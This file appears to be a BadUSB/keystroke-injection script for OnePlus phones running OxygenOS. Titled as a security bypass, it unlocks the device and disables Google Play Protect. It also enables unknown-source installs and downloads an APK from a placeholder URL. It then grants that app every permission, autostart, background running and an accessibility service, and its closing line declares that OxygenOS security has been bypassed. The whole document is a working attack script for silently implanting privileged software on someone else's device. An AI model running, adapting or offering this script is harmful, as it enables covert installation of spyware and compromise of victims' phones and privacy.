@@ -1,0 +1,352 @@
+REM OnePlus OxygenOS Security Bypass and App Installation
+REM Author: AryanVBW
+REM Version: 1.0
+REM Optimized for OnePlus devices running OxygenOS
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (OxygenOS method)
+SWIPE 500 1800 500 800
+DELAY 1500
+
+REM ---- STEP 1: DISABLE OXYGENOS SECURITY FEATURES ----
+
+REM Open Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Security & Lock screen (OxygenOS path)
+STRING security
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Open Google Play Protect settings
+STRING play protect
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable Play Protect scanning
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm turning off
+STRING turn off
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Go back to Security
+BACK
+DELAY 800
+
+REM ---- STEP 2: ENABLE DEVELOPER OPTIONS (OXYGENOS PATH) ----
+
+REM Go to About phone in OxygenOS
+BACK
+DELAY 800
+STRING about
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find Build Number
+STRING build
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Tap on Build Number 7 times
+REPEAT 7 {
+    ENTER
+    DELAY 300
+}
+DELAY 1500
+
+REM Enter PIN/pattern if prompted
+STRING 1234
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 3: ENABLE INSTALLATION FROM UNKNOWN SOURCES (OXYGENOS PATH) ----
+
+REM Go back to main Settings
+BACK
+DELAY 800
+
+REM Navigate to Apps & notifications in OxygenOS
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find "Special app access"
+STRING special app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find "Install unknown apps"
+STRING install unknown
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select Chrome browser
+STRING chrome
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable permission (OxygenOS toggle)
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 4: DISABLE OXYGENOS BATTERY OPTIMIZATION ----
+
+REM Go back to Special app access
+BACK
+DELAY 800
+
+REM Find "Battery optimization"
+STRING battery optimization
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Show all apps
+STRING all apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find Chrome (for now, we'll set app-specific later)
+STRING chrome
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select "Don't optimize"
+STRING don't optimize
+DELAY 800
+ENTER
+DELAY 1000
+
+REM ---- STEP 5: DOWNLOAD AND INSTALL APK (OXYGENOS METHOD) ----
+
+REM Open Chrome browser
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access address bar (OxygenOS Chrome)
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Enter APK URL
+STRING https://example.com/app.apk
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM Wait for download to start and complete
+DELAY 10000
+
+REM Open notification shade (OxygenOS gesture)
+SWIPE 500 100 500 1700
+DELAY 1500
+
+REM Tap on download notification
+ENTER
+DELAY 3000
+
+REM Handle OxygenOS security warning
+STRING install
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 3000
+
+REM ---- STEP 6: GRANT PERMISSIONS (OXYGENOS PERMISSION MODEL) ----
+
+REM Go to Settings for OxygenOS permission management
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps in OxygenOS
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the newly installed app
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Permissions in OxygenOS
+STRING permissions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Grant all permissions (OxygenOS permission UI)
+REPEAT 10 {
+    TAB
+    DELAY 300
+    ENTER
+    DELAY 1000
+    STRING allow
+    DELAY 500
+    ENTER
+    DELAY 800
+    BACK
+    DELAY 800
+}
+
+REM ---- STEP 7: DISABLE BATTERY OPTIMIZATION FOR THE APP ----
+
+REM Go back to app settings
+BACK
+DELAY 800
+
+REM Go to Battery settings
+STRING battery
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Set to "Don't optimize"
+STRING don't optimize
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 8: ENABLE AUTOSTART (OXYGENOS SPECIFIC) ----
+
+REM Go back to app settings
+BACK
+DELAY 800
+
+REM Find "Autostart" option (OxygenOS specific)
+STRING autostart
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 9: ENABLE BACKGROUND ACTIVITY (OXYGENOS SPECIFIC) ----
+
+REM Go back to app settings
+BACK
+DELAY 800
+
+REM Find "Background activity" option
+STRING background
+DELAY 800
+ENTER
+DELAY 1500
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 10: ENABLE ACCESSIBILITY SERVICES ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Accessibility in OxygenOS
+STRING accessibility
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find installed app
+STRING app
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable service
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm enabling
+STRING allow
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 2000
+
+REM ---- STEP 11: LAUNCH THE APP ----
+
+REM Return to home screen
+HOME
+DELAY 800
+
+REM Open app drawer (OxygenOS method)
+SWIPE 500 1700 500 700
+DELAY 1000
+
+REM Find and open the app
+STRING app
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- FINISHED ----
+REM OxygenOS security has been bypassed and app installed with full permissions
